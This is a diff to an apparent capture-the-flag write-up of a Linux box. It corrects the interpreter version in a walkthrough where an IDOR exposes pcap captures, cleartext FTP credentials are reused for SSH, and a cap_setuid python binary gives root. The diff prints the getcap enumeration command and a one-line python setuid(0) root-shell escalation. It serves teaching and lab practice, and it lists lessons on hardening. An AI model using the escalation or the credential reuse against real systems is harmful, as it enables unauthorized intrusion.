@@ -18,7 +18,7 @@ tags: [linux, web, idor, pcap, capabilities]
 
 ## TL;DR
 
-A panel generates packet captures (pcap) and serves them by an incrementing identifier. Changing that identifier downloads another user's capture, and inside travels a **cleartext FTP session**. Those credentials give SSH access, and `getcap` shows `python3.15` carries `cap_setuid` → instant root.
+A panel generates packet captures (pcap) and serves them by an incrementing identifier. Changing that identifier downloads another user's capture, and inside travels a **cleartext FTP session**. Those credentials give SSH access, and `getcap` shows `python3.8` carries `cap_setuid` → instant root.
 
 ## Recon
 
@@ -84,13 +84,13 @@ getcap -r / 2>/dev/null
 ```
 
 ```
-/usr/bin/python3.15 cap_setuid=ep
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
 That binary can set its own UID to 0, so one line is enough:
 
 ```bash
-/usr/bin/python3.15 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 id                 # uid=0(root)
 cat /root/root.txt # <ROOT_FLAG>
 ```
@@ -107,7 +107,7 @@ cat /root/root.txt # <ROOT_FLAG>
 - An incrementing identifier in a URL is a potential IDOR: if the server never checks ownership, the data belongs to everyone.
 - FTP sends credentials in cleartext; one capture is enough to reuse them over SSH.
 - Capabilities are a modern SUID: `cap_setuid` on an interpreter is instant root and never shows up in `find -perm -4000`.
-- `getcap -r /` should be as mandatory as hunting SUIDs on any Linux box.
+- `getcap -r /` should be as mandatory as hunting SUIDs on any Linux box. The exact interpreter version comes from `getcap`'s output, not from the port banner: here it is `python3.8`.
 
 ## Mitigations and detection
 
